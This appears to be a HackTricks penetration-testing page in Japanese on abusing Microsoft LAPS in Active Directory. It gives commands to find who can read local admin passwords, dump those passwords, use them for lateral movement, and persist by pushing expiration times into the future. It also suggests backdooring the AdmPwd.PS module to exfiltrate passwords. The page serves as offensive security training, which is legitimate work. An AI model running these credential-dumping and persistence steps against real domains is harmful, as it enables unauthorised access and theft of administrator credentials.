# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

評価中に遭遇する可能性がある **2種類のLAPS** があります:

- **Legacy Microsoft LAPS**: ローカル管理者パスワードを **`ms-Mcs-AdmPwd`** に、期限切れ時刻を **`ms-Mcs-AdmPwdExpirationTime`** に保存します。
- **Windows LAPS** (2023年4月の更新以降、Windowsに組み込み): legacy mode をエミュレートすることもできますが、native mode では **`msLAPS-*`** 属性を使用し、**password encryption**、**password history**、および domain controllers 向けの **DSRM password backup** をサポートします。

LAPS は **local administrator passwords** を管理するために設計されており、それらを **unique, randomized, and frequently changed** にします。domain-joined computers でこれらの属性を読める場合、通常は対象ホストへ **local admin として pivot** できます。多くの環境では、重要なのはパスワード自体を読むことだけではなく、パスワード属性へのアクセスを **誰に委任したか** を見つけることでもあります。

### Legacy Microsoft LAPS attributes

domain の computer objects では、legacy Microsoft LAPS の実装により 2つの属性が追加されます:

- **`ms-Mcs-AdmPwd`**: **plain-text administrator password**
- **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**

### Windows LAPS attributes

Native Windows LAPS は computer objects にいくつかの新しい属性を追加します:

- **`msLAPS-Password`**: encryption が有効でない場合に JSON として保存される clear-text password blob
- **`msLAPS-PasswordExpirationTime`**: 予定された有効期限時刻
- **`msLAPS-EncryptedPassword`**: 暗号化された current password
- **`msLAPS-EncryptedPasswordHistory`**: 暗号化された password history
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: domain controllers 向けの暗号化された DSRM password data
- **`msLAPS-CurrentPasswordVersion`**: 新しい rollback-detection logic で使われる GUID-based version tracking (Windows Server 2025 forest schema)

**`msLAPS-Password`** が読める場合、その値は account name、update time、そして clear-text password を含む JSON object です。例えば:
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### 有効化されているか確認する
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## LAPS Password Access

`\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` から **raw LAPS policy** をダウンロードし、[**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) パッケージの **`Parse-PolFile`** を使って、このファイルを人間が読める形式に変換できます。

### Legacy Microsoft LAPS PowerShell cmdlets

legacy LAPS module がインストールされている場合、通常は以下の cmdlets が利用できます:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

Native Windows LAPS には新しい PowerShell module と新しい cmdlets が付属しています:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText
```
いくつかの運用上の詳細がここでは重要です。

- **`Get-LapsADPassword`** は **legacy LAPS**、**clear-text Windows LAPS**、および **encrypted Windows LAPS** を自動的に処理します。
- password が encrypted で、**read** はできても **decrypt** はできない場合、cmdlet は metadata を返しますが、clear-text password は返しません。
- **Password history** は **Windows LAPS encryption** が有効な場合にのみ利用できます。
- domain controllers では、返される source は **`EncryptedDSRMPassword`** になることがあります。

### PowerView / LDAP

**PowerView** は、**誰が password を read できるか** と **実際にそれを read する** ためにも使えます:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
If **`msLAPS-Password`** が読み取れる場合、返された JSON を解析し、パスワードには **`p`**、管理対象のローカル admin account name には **`n`** を抽出してください。

### Linux / remote tooling

Modern tooling は legacy Microsoft LAPS と Windows LAPS の両方をサポートしています。
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Notes:

- 最近の **NetExec** ビルドは **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`**, および **`msLAPS-EncryptedPassword`** をサポートしている。
- **`pyLAPS`** は Linux から **legacy Microsoft LAPS** に対しては依然として有用だが、対象は **`ms-Mcs-AdmPwd`** のみ。
- 環境が **encrypted Windows LAPS** を使っている場合、単純な LDAP read だけでは不十分で、**authorized decryptor** であるか、サポートされている decrypt path を悪用する必要がある。

### Directory synchronization abuse

ドメインレベルの **directory synchronization** 権限を各コンピュータオブジェクトへの直接 read access の代わりに持っている場合でも、LAPS は依然として興味深い。

**`DS-Replication-Get-Changes`** と **`DS-Replication-Get-Changes-In-Filtered-Set`** または **`DS-Replication-Get-Changes-All`** の組み合わせは、legacy **`ms-Mcs-AdmPwd`** のような **confidential / RODC-filtered** 属性を synchronize するために使える。BloodHound はこれを **`SyncLAPSPassword`** として model する。replication-rights の背景は [DCSync](dcsync.md) を確認すること。

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) は、いくつかの functions により LAPS の enumeration を容易にする。\
その 1 つは、**LAPS enabled** なすべての computers に対する **`ExtendedRights`** の parsing である。これにより、**LAPS passwords の read を特に delegated された groups**、つまり多くの場合 protected groups の users が分かる。\
domain に computer を join した **account** は、その host に対して `All Extended Rights` を受け取り、この right によりその **account** は **passwords を read** できる。Enumeration により、ある host 上の LAPS password を read できる user account が見つかることがある。これは、LAPS passwords を read できる特定の AD users を **target** にするのに役立つ。
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## NetExec / CrackMapExec を使った LAPS パスワードのダンプ

対話型の PowerShell がない場合でも、LDAP 経由でこの権限をリモートから悪用できます:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
これは、ユーザーが読み取れるすべての LAPS secrets をダンプし、別のローカル管理者パスワードを使って lateral movement できるようにします。

## LAPS Password の使用
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS永続化

### 有効期限

管理者権限を取得すると、**パスワードを取得**し、**有効期限を将来に設定**することで、マシンが**パスワードを更新**するのを**防ぐ**ことが可能です。

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS は代わりに **`msLAPS-PasswordExpirationTime`** を使用します:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> パスワードは、**admin** が **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`** を使用した場合、または **Do not allow password expiration time longer than required by policy** が有効な場合でも、引き続きローテーションされます。

### AD バックアップから過去のパスワードを復元する

**Windows LAPS encryption + password history** が有効な場合、マウントされた AD バックアップは追加の secrets ソースになり得ます。マウントされた AD スナップショットにアクセスでき、**recovery mode** を使用できるなら、実行中の DC と通信せずに、より古い保存済みパスワードをクエリできます。
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
This is mostly relevant during **AD backup theft**, **offline forensics abuse**, or **disaster-recovery media access**.

### バックドア

legacy Microsoft LAPS の元のソースコードは [here](https://github.com/GreyCorbel/admpwd) で見つけられるため、コード内にバックドアを仕込むことが可能です（たとえば `Main/AdmPwd.PS/Main.cs` の `Get-AdmPwdPassword` メソッド内で）。これにより、何らかの方法で**新しいパスワードを exfiltrate したり、どこかに保存したり**できます。

その後、新しい `AdmPwd.PS.dll` をコンパイルして `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` にマシンへアップロードし（そして modification time を変更します）。

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
